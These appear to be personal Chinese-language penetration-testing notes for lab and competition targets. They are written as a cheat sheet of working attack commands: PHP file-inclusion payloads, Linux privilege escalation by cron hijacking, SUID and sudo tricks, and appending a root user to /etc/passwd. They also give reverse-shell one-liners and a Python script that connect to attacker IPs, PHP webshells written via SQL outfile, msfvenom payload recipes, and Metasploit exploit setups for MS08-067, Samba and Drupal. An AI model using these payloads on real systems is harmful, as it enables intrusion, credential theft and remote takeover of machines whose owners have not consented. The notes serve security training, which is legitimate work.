Windows：h[ttp://192.168.6.128:8001/vulnerabilities/fi/?page=file:///C:\\](http://192.168.6.128:8001/vulnerabilities/fi/?page=file:///C:)DVWA-master\\vulnerabilities\\fi\\1.txt绝对路径（注意可以POST传参）

![4dd48db360ebcd6629022e8c45bece8a.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image51.jpeg){width="5.760416666666667in"
height="4.5879429133858265in"}

**zip(没成功过)**

条件：allow_url_fopen: off/on allow_url_include: off/on

1 、现将要执行 php 代码写好并且命名为 a.txt，将 a.txt 进行 zip
压缩，命名为 a.zip，如果可以上传 zip 文件便直接上传，如若不能可将 a.zip
命名为 a.jpg 上传；

2 、将 a.php 直接压缩成 a.bz2

<http://127.0.0.1/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.zip%23a.txt>

**data**

allow_url_fopen: on allow_url_include: on

<http://192.168.6.128:8001/vulnerabilities/fi/?page=data://test/plain,>\<?php
phpinfo();?\>

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image52.png){width="5.760416666666667in"
height="3.2402351268591425in"}

<http://192.168.6.128:8001/vulnerabilities/fi/?page=data://test/plain;base64,PD9waHAgcGhwaW5mbygpPz4=>

**php伪协议**

php://filter

php://filter/read=convert.base64-encode/resource=index.php生成base64的index.php源码

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image53.png){width="5.760416666666667in"
height="3.2402351268591425in"}

php://input

php://input利用

![64228f2adb7d217f6ce61c41e71c29d0.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image54.jpeg){width="5.760416666666667in"
height="3.591901793525809in"}

http://

<http://192.168.222.144/dvwa/vulnerabilities/fi/?page=http://192.168.222.128/>phpinfo.php

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image55.png){width="5.760416666666667in"
height="3.2402351268591425in"}

或者是包含有命令执行的php使用

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image56.png){width="5.760416666666667in"
height="3.2402351268591425in"}

网页备份文件index.php.bak

Vim缓存
由于在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容：

第一次产生的交换文件名为 .index.php.swp

如果当有人修改创建index.php文件我们就可以不停访问.index.php.swp这样就可以看见他的源代码（index前面必须有点）

.DS_Store泄露是什么？

.DS_Store 文件利用 .DS_Store 是 Mac OS
保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。

(有些题写的是update上传，其实可能是sqli注意分析)

如果我们渗透进去看见有/.dockerenv文件，再查看/proc/1/cgroup
有没有docker字符有的话就可能进入了docker环境使用我们要逃逸出这个docker环境

**提权**

shadow提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image57.png){width="5.760416666666667in"
height="2.3421478565179354in"}

docker提权

docker pull alpine

docker run -v /:/mnt -it alpine

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image58.png){width="5.760416666666667in"
height="0.6849682852143482in"}

环境变量提权：

msf提权

可先利用enum_patches模块shou

msf使用 post/multi/recon/local_exploit_suggester模块

windows使用local_exploit_suggester模块，指定低权限用户的session，进行本地提权

post/multi/recon/local_exploit_suggester

使用mteasploit保持权限控制

use post/linux/manage/sshkey_persistence

不过要降低私钥链接的权限 600
，如果使用不成功说明是/root/.ssh可能没创建或者权限不够需自己分析

或者使用这个模块就不需要加权限和记文件名

use auxiliary/scanner/ssh/ssh_login_pubkey

set rhosts 192.168.1.190

set key_path /root/.msf4/loot/

set username test

run

内核提权

uname -r 脏牛等

当然可以在kali上编译完后再转移到靶机执行，如果没权限就自己chmod加权限

**本地任务提权**

crontab -l 查看是否有特殊文件是root权限执行的

使用命令查看电脑定时任务 cat
/etc/crontab(有些不行，应该会提供工具无需root监控进程)

sh定时任务提权：

使用：echo \"cp /bin/bash /tmp/bash; chmod +s /tmp/bash\" \>\> test.sh
(test.sh为crontab里的定时执行文件)

到了时间便自动生成bash文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image59.png){width="5.760416666666667in"
height="2.240161854768154in"}

使用/tmp/bash -p 及可提权

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image60.png){width="5.760416666666667in"
height="0.5582425634295713in"}

**su爆破**

**搭建环境**

linux系统

只要sudo版本\< 1.8.28

修改配置文件

在/etc/sudoers 添加配置： test ALL=(ALL:!root)ALL

这样就可以执行：

tom@bogon:/\$ sudo -u#-1 cat /etc/shadow

tom@bogon:/\$ sudo -u#4294967295 cat /etc/shadow

root:\$6\$nuqirz/F\$0yXjbfS2YYzmqh

**sucrack 使用方法**

sucrack 的用法非常简单，最基础的命令如下：

sucrack -w 20 wordlists.txt

**nfs 提权**

showmount -e 192.168.111.122

![a65f58474f04a15e956c5873262833c0.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image61.jpeg){width="4.222222222222222in"
height="0.9695472440944882in"}

将 /home/peter 挂载到本地 /mnt/peter 查看

mount 192.168.111.122:/home/peter /mwnt/peter cd /mnt/peter

ls -la，发现没有写权限，但只要 uid 为 1001，gid 为 1005
的用户就可以，由于是挂载到本地，本地创建一个这样账户，即可对此目录进行写权限

![be8a73f5c621f3685bcb9e4b420f6557.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image62.jpeg){width="5.760416666666667in"
height="3.497396106736658in"}

ls -l /mnt/，发现 uid 为 1001，gid 为 1005

![ebee339385e0c422978583de33f9087f.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image63.jpeg){width="5.694444444444445in"
height="1.4288254593175853in"}

groupadd -g 1055 boogle，创建 gid 为 1055 的组 boogle

adduser boogle -uid 1001 -gid 1005

![e1e97276a2cf03727eb628ef1307eaf4.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image64.jpeg){width="5.760416666666667in"
height="4.288616579177603in"}

此时可以写入文件，则生成 boogle 的 ssh 公私钥，

![5c5b28b63cf75e1c478e2943dbd4b877.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image65.jpeg){width="5.760416666666667in"
height="3.155845363079615in"}

先在 /mnt/peter/ 目录创建 /.ssh/ 目录

本地生成的 id_rsa.pub 是在 /root/.ssh/ 目录下，复制到
/mnt/peter/.ssh/authorized_keys，如下图：

![fc07fec7fc0a6e49e651b4c71480fe4c.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image66.jpeg){width="5.760416666666667in"
height="1.8697298775153106in"}

**suid :**

获取root帐户

SUID ＂s＂使文件属主（这里是root）有rws权限。你要寻找的就是这个＂s＂

/etc/passw提权

**真正的root**

**密码要和用户用同样字**

perl -le \'print crypt(\"test\",\"addedsalt\")\'

输出：adMpHktIn0tR2

使用perl语言生成带有盐值的密码：test

  ---------- ------------ ---------- ---------- -------------- ------------ ------------
  root       :x           :0         :0         :root          :/root       :/bin/bash

  用户名     密码占位符   用户ID     主组ID     附加描述信息   用户家目录   默认shell
  ---------- ------------ ---------- ---------- -------------- ------------ ------------

echo \"test:adMpHktIn0tR2:0:0:User_like_root:/root:/bin/bash\"
\>\>/etc/passwd

然后登录test就是直接是root

或者是（echo \"test:x:0:0::/:/bin/bash\" \>\> /etc/passwd 空密码登录）

**bash进行反弹**

bash -i \>& /dev/tcp/172.16.123.123/4444 0\>&1

\>\$ 0\>\$1 都是重定向的标志

bash -i 打开交互的bash

**echo 升级版bash反弹**

echo \"bash -i \>& /dev/tcp/172.16.123.102/4444 0\>&1\" \| bash

**PHP脚本利用bash反弹shell**

\<?php system(\"bash -c \'bash -i \>& /dev/tcp/172.16.123.122/4444
0\>&1\' \")?\>

将所有输入输出都重定向到攻击机的4444端口

python代码执行反弹shell的脚本如下：

import socket,os,subprocess

RHOST=\'192.168.26.20\' \# Change it

RPORT=4444 \# Change it

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) \#
创建一个TCP-socket对象

s.connect((RHOST,RPORT)) \# 连接攻击者

os.dup2(s.fileno(),0)# 复制链接符

os.dup2(s.fileno(),1)

os.dup2(s.fileno(),2)

p=subprocess.call(\[\"/bin/sh\",\"-i\"\]) \# 创建子进程调用SHELL

**telnet进行反弹**

在攻击机开两个端口一个输入，一个输出

nc -lvp 4444

nc -lvp 5555

telnet 172.16.123.123/4444 \| /bin/bash \| telnet 172.16.123.123/5555

**编程语言也可以进行反弹，有些命令明明是有但用不了
比如说ifconfig用不了，我们可以whereis ifconfig 得到绝对路径
换一种方法使用/usr/sbin/ifocnfig**

find提权

根据提示信息中的-exec很容易想到find提权，检验一下find是否具有SUID。

find / -perm -u=s -type f 2\>/dev/null

使用find -exec生成一个具有root权限的shell

sudo find -exec \'/bin/sh\' \\;

这里可以用nc进行文件传输

git提权

sudo -l

发现/usr/bin/git

sudo git -p help 

!/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell

teehee提权

echo \'admin::0:0::/home/admin:/bin/bash\' \| sudo teehee -a /etc/passwd

su admin

nmap

适用版本:nmap2.02至5.21

在早期nmap版本中,带有交互模式,因而允许用户执行shell命令

使用如下命令进入nmap交互模式:

最好是绝对路劲

nmap \--interactive

在nmap交互模式中 通过如下命令提权

nmap\> !sh

sh-3.2# whoami

root

msf当中也有利用nmap进行提权的模块

exploit/unix/local/setuid_nmap

![29d62dbb9b3905e90097d1647389fbee.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image67.jpeg){width="5.760416666666667in"
height="1.2856583552055993in"}

![c6e3319900e4dc534da1a79b0eabd272.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image68.jpeg){width="5.760416666666667in"
height="0.9433727034120735in"}

linux一般都安装了nc 我们也可以利用nc 广播或反弹shell

广播shell:

find user -exec nc -lvp 4444 -e \'/bin/sh\' \\;

在攻击机上:

nc 靶机ip 4444

反弹shell

find /etc/passwd -exec bash -c \'bash -i \>&
/dev/tcp/114.xxx.xxx.96/4444 0\>&1\' \\;

在攻击机上:

nc -lvp 4444

l：表示入站 v:表示输出信息级别 p：表示端口

Vim

vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。

读取文件

vim /etc/passwd

通过vim进入shell

#vim命令

sudo vim /etc/passwd

:!/bin/sh

man sudo提权

sudo man man

!/bin/bash （vim/vi/man都基本上进去就!/bin/bash皆可提权）

Bash

以下命令将以root身份打开一个bash shell。

bash -p

bash-3.2# id

uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)

![504d40196471ef5cbbac7c23fa813773.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image69.jpeg){width="4.444444444444445in"
height="0.8534995625546806in"}

less

less命令也可以进入shell

sudo less /etc/passwd

#在less中输入:

!/bin/sh

more

more命令进入shell和less相同

sudo more /etc/passwd

#在more中输入:

!/bin/sh

要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用!命令进入shell

nano

nano也算是比较上古的文本编辑器了

nano进入shell的方法为

nano #进入nano编辑器

Ctrl + R

Ctrl + X

#即可输入命令

![3f153fed91207a32180350151d54cd40.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image70.jpeg){width="5.760416666666667in"
height="0.6511778215223097in"}

cp

使用cp 命令覆盖原来的/etc/passwd文件

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image71.png){width="5.458333333333333in"
height="0.875in"}

搭建suid awk

将awk加入/etc/sudoers

\[root@localhost \~\]# visudo

test ALL=(root) NOPASSWD: /usr/bin/awk

**渗透漏洞：**

**PHPMyadmin**

信息收集 查看phpMyAdmin版本

readme.php

README

changelog.php

Change

Documetation.html

Documetation.txt

translators.html

列如:http://xxx.xxx/phpMyAdmin/readme.php

1.版本2.11.3 / 2.11.4

万能密码:用户名 \\\'localhost\\\' @ \\\'@\"则登录成功

2.版本2.11.9.2

弱口令:用户名:root 密码:空

3.版本2.11.x \< 2.11.9.5 或3.x \< 3.1.3.1

CVE-2009-1151(远程代码执行):MSF(exploit/unix/webapp/phpmyadmin_config)

4.版本版本v3.5.2.2

CVE-2009-1151(任意PHP代码攻击):
MSF(exploit/multi/http/phpmyadmin3522_backdoor)

5.版本3.5.x \< 3.5.8.1 或4.0.0 \< 4.0.0-rc3

CVE-2013-3238(远程PHP代码执行)
MSF(exploit/multi/http/phpmyadminpregreplace)

溢出漏洞

**cve-2012-1823**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image72.png){width="5.760416666666667in"
height="4.205867235345582in"}

phpinfo()查看在Server API 中有CGI/FastCGI

php \< 5.3.12 php \< 5.4.2

就可以使用

use **exploit/multi/http/php_cgi_arg_injection**

set payload php/meterpreter_reverse_tcp

set rhost ip

run

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image73.png){width="5.760416666666667in"
height="1.1980905511811024in"}

**MS11_003之生成后门链接**

set payload windows/meterpreter/reverse_tcp

set URIPATH ui来设置访问模块的具体地址

set srvhost kali ip

set lhost kali ip

set targets 1

使用命令exploit -j后台启动该模块，等待靶机连接上来

sessions 查看连接会话

sessions 5连接

ms10-046网页欺骗

**MS14-064网页诱骗**

和ms11-003一样使用但是影响范围一般是xp

可以和xss梦幻联动（\<a
href=\"<http://www.feiniaomy.com>\"\>\</a\>）反弹shell

**MS08-067 445端口rpc请求缓冲区溢出漏洞，权够大**

**影响:XP系统**

windows/x64/shell/reverse_tcp

**CVE-2019-0708 3389端口反弹meterpreter**

windows/x64/shell/reverse_tcp

而这个payload在虚拟机中进行复现时就会造成蓝屏

必须是同一个网段才可以弹meterpreter

**MS17-010 445 端口 SMB系统协议漏洞，权够大**

**IIS6.0 Webdav 漏洞开启了WebDAV扩展服务就可能有漏洞
exploit/windows/iis/cve-2017-7269 普通用户权
可以利用提权文件启动纵向提权**

**MS14-064网页诱骗 exploit/windows/browser/ms14_064_ole_code_execution
用渗透机打开浏览器访问形成三角杀**

**Windows之msf后渗透提权**

ps看进程

steal_token pid （pid=有admin的最前的序列号）

盗窃给定进行的可用令牌并进行令牌假冒。先用ps查看有哪些pid是属于administrator的，再盗取这个pid即可。

getuid看权限

**Mimikatz神器**

现在在msf里面改成了kiwi ，使用前必须是SYSTEM用户,load kiwi

获取明文密码 creds_all

获取哈希值 creds_msv

windows后渗透之哈希值爆破

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image74.png){width="5.760416666666667in"
height="0.630161854768154in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image75.png){width="5.760416666666667in"
height="2.09875656167979in"}

**distcc后门漏洞**

1099端口

影响范围：该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制

search distcc_exec

set payload cmd/unix/reverse_perl

**ssh私钥泄漏破解登录**

**（私钥也可以在服务器创建私钥和公钥，然后把私钥发个客服机，当然要cp
id_rsa.pub authorized_keys）**

**获取到ssh私钥后先加权限chmod 600 id_rsa**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image76.png){width="2.9027777777777777in"
height="0.5202110673665792in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image77.png){width="5.760416666666667in"
height="1.2467749343832022in"}

需要爆破ssh私钥密码

 使用ssh2john.py将[密钥](https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5&spm=1001.2101.3001.7020)信息转换为john可识别信息

使用ssh2john id_rsa \> rsa

解密转化后可识别信息

john rsa

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image78.png){width="5.760416666666667in"
height="1.9455325896762905in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image79.png){width="4.944444444444445in"
height="0.8952045056867891in"}

**FTP渗透**

anonymous匿名登录

**FTP提权如果ftp用户有执行权限，可以试试使用quote site exec**

例如： quote site exec net user temp temp /add

msfconsole:

**Vsftp_2.3.4笑脸 vsftpd_234_backdoor  权够大**

**Samba MS-RPC Shell命令注入漏洞(cve-2007-2447)**

**Samba 版本号3.x-4.x 权够大**

**search usermap_script**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image80.png){width="5.760416666666667in"
height="1.3118503937007875in"}

S**amba 远程代码执行漏洞 (CVE-2017-7494)**

search is_known_pipename

影响：Samba 3.5+ \<4.6.4 \<4.5.10 \<4.4.14

![184394efb17e429f9efc1e11cc41acc9.jpg](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image81.jpeg){width="5.760416666666667in"
height="2.9114020122484687in"}

**Unreal UnreallRCd3.2.8.1后门漏洞**

search rihd

set payload cmd/unix/reverse_perl

set rhost

set lhost

**windows传递哈希值提权**

root@bt:\~# msfconsolemsf \> use windows/smb/psexec

exploit(psexec) \> set payload windows/meterpreter/reverse_tcp

exploit(psexec) \> set LHOST 192.168.1.116

exploit(psexec) \> set RHOST 192.168.1.117

exploit(psexec) \>set SMBUser administrator

exploit(psexec) \> set SMBPass
1AA818381E4E281BAAD3B435B51404EE:5F18A8499CDD4F43D89424AD39CE9AF7

**WordPress**：

仅需要知道后台密码和用户可以开启msfconsole

搜索wp_admin_shell 调用exploit/unix/webapp/wp_admin_shell_upload

设置端口，用户名，密码，run就可以拿到

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image82.png){width="5.760416666666667in"
height="3.2600568678915134in"}

**drupal**

Drupal 7.54漏洞：

Drupal核心远程代码执行漏洞CVE-2018-7600

攻击脚本适用于7.31以下，所以适合7.24版本,可以利用漏洞增加admin权限用户

增加有admin权限的用户：admin1/admin1

python /usr/share/exploitdb/exploits/php/webapps/34992.py -t
<http://192.168.0.100> -u admin1 -p admin1

远程代码执行漏洞

msf

exploit/unix/webapp/drupal_drupalgeddon2

Drupal CMS最严重的安全漏洞之一

碰到drupal可以试试

drupal的数据库配置文件：/sites/default/settings.php（有用户名密码）

mysql拖库前提有数据库用户名和密码

mysqldump -uadmin -padmin drupal \> drupal.sql然后再下载

**msfvenom 木马**

msfvenom简单制作：

简单型：msfvenom --p \<payload\> \<payload options\>（攻击载荷）
LHOST=攻击机IP LPORT=监听端口 -f \<format\>（后缀类型） -o
\<path\>（生成文件名） （使用msfvenom -l payloads
可查看所有可以执行payload载荷 ）

**Linux：**

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=\<Your IP Address\>
LPORT=\<Your Port to Connect On\> -f elf \> shell.elf

**Windows**:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=\<Your IP Address\>
LPORT=\<Your Port to Connect On\> -f exe \> shell.exe

**PHP**:

msfvenom -p php/meterpreter_reverse_tcp LHOST=\<Your IP Address\>
LPORT=\<Your Port to Connect On\> -f raw \> shell.php

cat shell.php \| pbcopy && echo \'\<?php \' \| tr -d \'\\n\' \>
shell.php && pbpaste \>\> shell.php

**ASP**:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=\<Your IP Address\>
LPORT=\<Your Port to Connect On\> -f asp \> shell.asp

**JSP**:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=\<Your IP Address\>
LPORT=\<Your Port to Connect On\> -f raw \> shell.jsp

**Python**:

msfvenom -p cmd/unix/reverse_python LHOST=\<Your IP Address\>
LPORT=\<Your Port to Connect On\> -f raw \> shell.py

**Bash**:

msfvenom -p cmd/unix/reverse_bash LHOST=\<Your IP Address\> LPORT=\<Your
Port to Connect On\> -f raw \> shell.sh

**Perl**:

msfvenom -p cmd/unix/reverse_perl LHOST=\<Your IP Address\> LPORT=\<Your
Port to Connect On\> -f raw \> shell.pl

文件上传：

如果他是先将图片上传上去，才开始进行判断后缀名、二次渲染

我们就可以使用下崽的办法发应该图片马内容如下 （）

\<?php

fputs(fopen(\'shell.php\',\'w\'),\'\<?php \@eval(\$\_POST\[cmd\])?\>\');

?\>

![itm1zcfvcc.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image83.png){width="5.760416666666667in"
height="2.244925634295713in"}

windows 图片马生成隐藏信息:copy 1.jpg/b+2.php 3.jpg

xss beef 使用链接比用公式

\<script src=\"<https://192.168.106.129:3000/hook.js>\"\>\</script\>

mysql -uroot -p123456 -e \"show databases;\" 登录时执行mysql命令

linux后渗透进去可以试试mysql能不能启用登录获得权限

mysql写木马先使用show variables like \"secure_file_priv\";

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image84.png){width="5.666666666666667in"
height="1.625in"}

很明显写入目录是网站目录，所以可以写入一句话木马并使用（80 open情况）

写入一句话

select \'\<?php \@eval(\$\_POST\[cmd\]);?\>\' into outfile
\"/var/www/html/x1ong.php\"

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image85.png){width="5.760416666666667in"
height="1.394899387576553in"}

**脏牛提权**

1.介绍

漏洞编号：CVE-2016-5195

漏洞名称：脏牛（Dirty Cow）

漏洞危害：低权限用户利用该漏洞可以在全版本linux系统上实现本地提权，获取root权限

影响范围：linux内核\>=2.6.22(2007年发行)开始就受影响了，2016.10.18才恢复

2.使用范围

发行版 内核版本

Centos7/RHEL7： 3.10.0-327.36.3.e17

Centos6/RHEL6： 2.6.32-642.6.2.e16

Ubuntu 16.10： 4.8.0-26.28

Ubuntu 16.04： 4.4.0-45.66

Ubuntu 14.04： 3.13.0-100.147

Debian 8： 3.16.36-1+debBu2

Debian 7： 3.2.82-1

比赛使用

gcc命令报错就说明行不通

WordPress：

当知道后台密码和用户可以开启msfconsole

搜索wp_admin_shell 调用exploit/unix/webapp/wp_admin_shell_upload

即可拿到shell

**漏洞表：**

**总结：**

**CVE-2018-4878**

漏洞实现诱导用户点击恶意网站，可获得shell权限

漏洞影响：小于或等于Adobe Flash Player 28.0.0.137版本

**CVE-2018-12613**

漏洞实现远程文件包含

影响版本：

phpmyadmin 4.8.0/4.8.0.1/4.8.1

CVE-2017-0176(Microsoft Windows 缓冲区错误漏洞)复现

Microsoft Windows XP版本至XP SP3版本和Server 2003版本至2003
SP2版本中的gpkcsp.dll文件的Smart
Card身份验证代码存在缓冲区溢出漏洞。远程攻击者可利用该漏洞在目标电脑上执行任意代码。

影响范围

Microsoft Windows_Server_2003

Microsoft Windows_Server_2003 Sp2

Microsoft Windows_Xp

Microsoft Windows_Xp Sp1

Microsoft Windows_Xp Sp2

Microsoft Windows_Xp Sp3

**Ubuntu内核OverlayFS权限逃逸漏洞(CVE-2021-3493)**

**支持 ubuntu 12.04/14.04/14.10/15.04 和内核版本大于 3.13.0 小于 3.19**

**CVE-2017-7269**

漏洞实现远程代码随意执行

影响版本：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS 6.0

**CVE-2017-7494**

俗称：linux永恒之蓝

**漏洞实现Samba远程代码执行**

**漏洞影响：Samba 3.5.0之后到4.6.4/4.5.10/4.4.14的中间所有版本**。

CVE-2017-15715

利用漏洞换行符绕过上传黑名单限制

漏洞影响版本：apache httpd2.4.0\~2.4.29

CVE-2017-8464

漏洞影响上限是windows10不过会被杀毒杀掉

[震网三代CVE-2017-8464漏洞复现 - 知乎
(zhihu.com)](https://zhuanlan.zhihu.com/p/101608776)

CVE-2016-5195

**漏洞危害：**

低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权

**影响范围**：

Linux内核\>=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。

CVE-2015-0240

漏洞实现Samba远程代码执行

CVE-2012-2122

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image86.png){width="5.760416666666667in"
height="3.4245286526684167in"}

漏洞绕过mysql身份认证

MS03-026

漏洞介绍：Microsoft Windows
DCOM [RPC](https://so.csdn.net/so/search?q=RPC&spm=1001.2101.3001.7020)接口长主机名远程缓冲区溢出漏洞。

MS08-067

**Windows Server服务RPC请求缓冲区溢出漏洞**

MS17-010

MS15-034

MS14-064(Microsoft Windows OLE远程代码执行漏洞)

MS11-003(windows7IE溢出攻击)

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image87.png){width="5.760416666666667in"
height="2.917613735783027in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image88.png){width="5.760416666666667in"
height="3.074335083114611in"}

漏洞机打开提权，（实用于横向提权，查看administato密码然后爆破之类的）

访问的时候需要多试试**监听就不要去碰了**，直到访问出后面有随机字符或监听出现

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image89.png){width="5.760416666666667in"
height="0.4813713910761155in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image90.png){width="5.760416666666667in"
height="2.8511154855643044in"}

**注意当使用使用错误参数后重新调整后执行会报错**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image91.png){width="5.760416666666667in"
height="0.9560520559930009in"}

此时需要改掉原来自带的监听端口和服务的8080端口

即可

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image92.png){width="5.760416666666667in"
height="3.013624234470691in"}

vsftp2.3.4

MS08-067

**CVE-2018-4878**

漏洞实现诱导用户点击恶意网站，可获得shell权限

漏洞影响：小于或等于Adobe Flash Player 28.0.0.137版本

使用msfvenom生产kali payload shell代码

Msfvenom --p windows/meterpreter/reverse_tcp lhost=172.16.1.17
lport=4444 --f python \> shellcode.txt

Cat shellcode.txt查看代码内容并复制

进入cve-2018-4878目录（没有就下载）

Vim cve-2018-4878.py 将里面的代码替换

Python cve-2018-4878.py 执行cve代码

开启apache2服务 将exploit.swf 和index2.html拷贝到/var/www/html

Cp exploit.swf index2.html /var/www/html

然后开启msfconsole进入监听模块/exploit/multi/handler

配置好后run --j

让目标访问index2.html诱导点击链接

成功拿到shell

**CVE-2018-12613**

漏洞实现远程文件包含

影响版本：

Phpmyadmin 4.8.0/4.8.0.1/4.8.1

漏洞发现：

登录进phpmyadmin后在url添加<http://IP/index.php?target=db_sql.php%253f/../../../../../etc/passwd>

实现包含/etc/passwd文件说明漏洞存在 

**CVE-2017-7269**

漏洞实现远程代码随意执行

影响版本：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS 6.0

使用nmap的webdav脚本扫描

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image93.png){width="5.760416666666667in"
height="3.198485345581802in"}

初步判断有漏洞条件

启动msfconsole

search cve\--2017- 7269 搜索webdav漏洞

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image94.png){width="5.760416666666667in"
height="2.380660542432196in"}

配置payload为windows/meterpreter/reverse_tcp

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image95.png){width="5.760416666666667in"
height="2.1888003062117236in"}

发现漏洞

加固：禁用webdav

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image96.png){width="5.760416666666667in"
height="4.246403105861767in"}

**CVE-2017-7494**

俗称：linux永恒之蓝

**漏洞实现Samba远程代码执行**

**漏洞影响：Samba 3.5.0之后到4.6.4/4.5.10/4.4.14的中间所有版本**。

 启动msfconsole

搜索 cve-2017-7494 search cve-2017-7494

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image97.png){width="5.760416666666667in"
height="4.132959317585302in"}

调用模块配置rhosts

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image98.png){width="5.760416666666667in"
height="2.2206977252843396in"}

**然后再 run**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image99.png){width="5.760416666666667in"
height="1.3124300087489065in"}

**漏洞成功存在**

**漏洞加固**

修改/etc/samba/smb.conf文件

添加 nt pipe support = no

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image100.png){width="5.760416666666667in"
height="2.945349956255468in"}

加固后漏洞利用不成功

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image101.png){width="5.760416666666667in"
height="1.4029669728783902in"}

CVE-2017-15715

利用漏洞换行符绕过上传黑名单限制

漏洞影响版本：apache httpd2.4.0\~2.4.29

将文件上传的phpinfo.php加个空格

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image102.png){width="5.760416666666667in"
height="4.296474190726159in"}

然后开启hex将空格20改成0a

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image103.png){width="5.760416666666667in"
height="4.377233158355206in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image104.png){width="5.760416666666667in"
height="4.334458661417323in"}

访问文件php后缀加上%0a就可以绕过黑名单

